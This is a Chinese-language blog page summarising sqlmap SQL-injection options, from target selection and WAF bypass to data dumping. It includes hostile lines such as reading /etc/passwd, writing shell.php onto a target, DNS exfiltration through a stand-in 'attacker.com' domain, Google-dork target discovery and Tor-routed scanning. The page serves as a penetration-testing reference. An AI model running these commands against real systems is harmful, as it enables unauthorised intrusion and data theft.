@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>SQL注入-SQLMAP總結 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,SQL注入," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SQL注入-SQLMAP總結</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-07-09
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="22SQL注入-SQLMAP總結"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="SQL注入-SQLMAP總結"><a href="#SQL注入-SQLMAP總結" class="headerlink" title="SQL注入-SQLMAP總結"></a>SQL注入-SQLMAP總結</h2><p>开源的SQL注入漏洞检测的工具，能够检测动态页面中的get/post参数，cookie，http头，还能够查看数据，文件系统访问，甚至能够操作系统命令执行</p>
+<p>检测方式：布尔盲注、时间盲注、报错注入、UNION联合查询注入、堆叠注入</p>
+<p>支持数据库：Mysql、Oracle、PostgreSQL、MSSQL、Microsoft Access、IBM DB2、<br>SQLite、Firebird、Sybase、SAP MaxDb</p>
+<h3 id="一、-基本參數"><a href="#一、-基本參數" class="headerlink" title="一、 基本參數"></a>一、 基本參數</h3><p>sqlmap –update 更新<br>sqlmap -h 查看常用参数<br>sqlmap -hh 查看全部参数<br>sqlmap –version 查看版本<br>sqlmap -v 查看执行过程信息，默认是1，一共 0 ~ 6<br>sqlmap–wizard 交互向导式的操作<br>sqlmap -d “mysql://user:<a href="mailto:&#112;&#x61;&#x73;&#x73;&#119;&#111;&#x72;&#x64;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#46;&#49;&#x30;">&#112;&#x61;&#x73;&#x73;&#119;&#111;&#x72;&#x64;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#46;&#49;&#x30;</a>:3386/dvwa”<br>mysql表示数据库类型、user:password账号和密码，@后表示要连接的服务器，3306端口，dvwa数据库名称</p>
+<h3 id="二、-確定目標"><a href="#二、-確定目標" class="headerlink" title="二、 確定目標"></a>二、 確定目標</h3><p>指定URL，get请求方式<br>-u “<a target="_blank" rel="noopener" href="http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1&quot;">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1&quot;</a></p>
+<p>使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个<br>-m url_list.txt</p>
+<p>扫描，使用Google语法得到的，url<br>-g “inurl:&quot;.php?id=1&quot;“</p>
+<p>Post提交方式，使用HTTP请求文件，该文件可从BurpSuit中导出（BurpSuit抓包–&gt;将请求复制到txt中即可）<br>-r request.txt</p>
+<p>Post提交方式，使用BurpSuit的log文件。（Options–&gt;Misc–&gt;Logging–&gt;Spider–&gt;勾选Request）<br>-l log.txt</p>
+<p>基于正则表达式去过滤日志内容，筛选需要扫描的对象<br>–scope=”(www)?.target.(com|net|arg)”</p>
+<p>使用配置文件进行扫描 (dpkg -L sqlmap | grep sqlmap.conf)<br>-c sqlmap.conf</p>
+<p>对于这种写法，加<em>号扫描<br>-u “<a target="_blank" rel="noopener" href="http://target_url/param1/value1">http://target_url/param1/value1</a></em>/param2/value2”</p>
+<h3 id="三、-配置目标参数"><a href="#三、-配置目标参数" class="headerlink" title="三、 配置目标参数"></a>三、 配置目标参数</h3><p>-p “username,id”        指定要扫描的参数<br>–skip=”id,user-agent”  排除指定的扫描参数<br>–data=”user=1&amp;pass=2”  指定扫描的参数，get/post都适用<br>–param-del=”;”         改变分隔符，默认是&amp;，因为有些网站不实用&amp;传递多个数据。<br>–cookie=”security=low;PHPSESSID=121123131”   使用cookie的身份认证<br>–drop-set-cookie       有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie<br>–user-agent=”aaaaaaaa” 使用浏览器代理头<br>–random-agent          使用随机的浏览器代理头<br>–host=”aaaaa”          使用主机头<br>–referer=”aaaaaa”      使用referer头<br>–headers=”host:aaaa\nUser-Agent:bbbb”          有些网站需要特定的头来身份验证<br>–method=GET            指定请求方式，还有POST<br>–auth-type Basic –auth-cred “user:pass”   身份认证，还有Digest、NTLM<br>–auth-file=”ca.PEM”    使用私钥证书去进行身份认证，还有个参数–auth-cert，未知用法。<br>–proxy=”<a target="_blank" rel="noopener" href="http://127.0.0.1:8087/&quot;">http://127.0.0.1:8087/&quot;</a>    使用代理去扫描目标，代理软件占用的端口在8087<br>–proxy-cred=”name:pass”    使用代理时的账号和密码<br>–ignore-proxy    忽略系统级代理设置，通常用于扫描本地网络目标，本网段</p>
+<h3 id="四、-配置目标行为"><a href="#四、-配置目标行为" class="headerlink" title="四、 配置目标行为"></a>四、 配置目标行为</h3><p>–force-ssl   使用HTTPS连接进行扫描<br>–delay=”3”   每次http请求之间的延迟时间，默认无延迟<br>–timeout=”10”  请求超时时间，浮点数，默认为30秒<br>–retries=”1”   http连接的重试次数，默认3次<br>–randomize=”id”  长度、类型与原始值保持一致的情况下,随机参数的取值。比如id=100 -&gt;id=1??<br>–safe-url=””   检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session<br>–safe-freq     每发送多少次注入请求后，发送一次正常请求，配合–safe-url使用。<br>–time-sec=”3”    基于时间的注入检测相应延迟时间，默认5秒<br>–union-cols 6-9  默认联合查询1-10列，随–level增加，最多支持100列。<br>–union-char 123  联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值<br>–technique US   指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测，有B、E、U、S、T、Q</p>
+<h3 id="五、-优化探测过程"><a href="#五、-优化探测过程" class="headerlink" title="五、 优化探测过程"></a>五、 优化探测过程</h3><p>–level<br>    2：检测cookie中是否含有注入<br>    3：检测user-agent、referer是否含有注入<br>    5：检测host是否含有注入<br>–risk 默认1，最高4，等级高容易造成数据被篡改风险<br>–predict-output    优化检测方法，不断比对大数据，缩小检测范围，提高效率，与–threads参数不兼容<br>–keep-alive        长连接、性能好，避免重复建立的网络开销，但大量长连接会占用服务器资源。与–proxy参数不兼容<br>–null-connection   只获取页面大小的值，通常用于盲注判断真假，与–text-only 不兼容<br>-o                  直接开启以上三个<br>–threads=7         提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与–predict-out不兼容<br>–string=”woaini” 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串<br>–not-string=”woaini”<br>–regexp<br>–code=200<br>–text-only<br>–titles=”Welcome”</p>
+<h3 id="六、-特定目标环境"><a href="#六、-特定目标环境" class="headerlink" title="六、 特定目标环境"></a>六、 特定目标环境</h3><p>–skip-urlencode  默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据<br>–eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”  在提交前，对参数进行pyhton的处理，提升效率<br>–dbms=”Mysql”    指定数据库类型，还可以加上版本 Mysql&lt;5.0&gt;<br>–os=”Windows”    指定操作系统，还可以是Linux<br>–invalid-bignum  sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如id=9999999<br>–invalid-logical 使用布尔值，比如 id 13 and 18=19<br>–no-cast         将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关<br>–no-escape       为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。<br>比如 select ‘foo’ –&gt; select cahr(102) + char(111) + char(111)<br>–prefix “‘)’”    添加前缀 【’)<br>–suffix “AND (‘abc’=’abc”  添加后缀【AND (‘abc’=’abc<br>–tamper=”tamper/between.py,tamper/randomcase.py”   使用脚本，绕过IPS、WAF等<br>–dns-domain attacker.com   攻击者控制了DNS服务器，可以提高取出数据的效率<br>–second-order <a target="_blank" rel="noopener" href="http://1.1.1.1/b.php">http://1.1.1.1/b.php</a>   在一个页面注入的结果，从另外一个页面提现出来</p>
+<h3 id="七、-查看基本信息"><a href="#七、-查看基本信息" class="headerlink" title="七、 查看基本信息"></a>七、 查看基本信息</h3><p>-f  扫描时加入数据库指纹检测<br>-b  查看数据库的版本信息</p>
+<h3 id="八、-查看数据信息"><a href="#八、-查看数据信息" class="headerlink" title="八、 查看数据信息"></a>八、 查看数据信息</h3><p>–users     查询所有的数据库账号<br>–dbs       查询所有数据库<br>–schema    查询源数据库（包含定义数据的数据）<br>-a          查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等<br>-D dvwa     指定数据库<br>–current-user  查询当前数据库用户<br>–current-db    查询当前数据库<br>–hostname  查看服务器的主机名<br>–Privileges -U username    查询username的权限<br>–roles     角色<br>–tables    查看所有的表<br>-T          指定表<br>–columns   查看所有的字段<br>-C          指定字段<br>–count     计数，查看有多少条数据<br>–exclude-sysdbs    排除系统库<br>–dump      查看数据<br>–start 3   查看第三条<br>–end 4     查看第四条<br>–sql-query “select * from users”     执行语句<br>–common-columns    暴力破解字段，应用于两种情况：①无权限读取数据。②mysql&lt;5.0 ，没有infomation_schema库<br>–common-tables     暴力破解表</p>
+<h3 id="九、-其他参数"><a href="#九、-其他参数" class="headerlink" title="九、 其他参数"></a>九、 其他参数</h3><p>–batch   自动选是<br>-s        sqllite会话文件保存位置<br>-t        记录流量文件保存位置<br>–charset=GBK   强制字符编码<br>–crawl=3       爬站深度<br>–csv-del=”;”   指定csv文件的分隔符<br>–dbms-cred     指定数据库账号<br>–flush-session 清空session<br>–force-ssl     强制使用HTTPS<br>–fresh-queries 重新检测，不使用本地已查询的数据<br>–hex           以16进制的形式编码dump出来的数据<br>–output-dir    输出目录<br>–parse-errors  分析和显示数据库内建报错信息<br>–save          将命令保存成配置文件<br>-z        参数助记符<br>–answer=”extending=N”    回答<br>–check-waf     检测WAF/IPS/IDS<br>–hpp           绕过WAF/IPS/IDS<br>–identify-waf  彻底检测WAF/IPS/IDS<br>–mobile        模拟智能手机设备<br>–purge-output  清除output文件夹<br>–smart         当有大量检测目标时，只选择基于错误的检测结果</p>
+<h3 id="十、-高级注入参数"><a href="#十、-高级注入参数" class="headerlink" title="十、 高级注入参数"></a>十、 高级注入参数</h3><p>–udf-inject,–shared-lib     编译共享库创建并且上传至DB Server，依次生成UDF实现高级注入<br>–file-read=”/etc/passwd”     文件系统访问<br>–file-write=”shell.php” –file-dest “/tmp/shell.php”   写文件到目标位置<br>–sql-shell       进入交互式mysql窗口<br>sqlmap.py -u <a target="_blank" rel="noopener" href="http://navisec.it/123.asp?id=1">http://navisec.it/123.asp?id=1</a> –tor -tor-type=SOCKS5 –torport=9050 –check-to<br>操作系统访问<br>注册表访问</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/22SQL%E6%B3%A8%E5%85%A5-SQLMAP%E7%B8%BD%E7%B5%90/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+              #SQL注入
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/21SQL%E6%B3%A8%E5%85%A5-SQLMAP/" target="_self">SQL注入-SQLMAP</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/25XSS-Labs/" target="_self">XSS-Labs</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
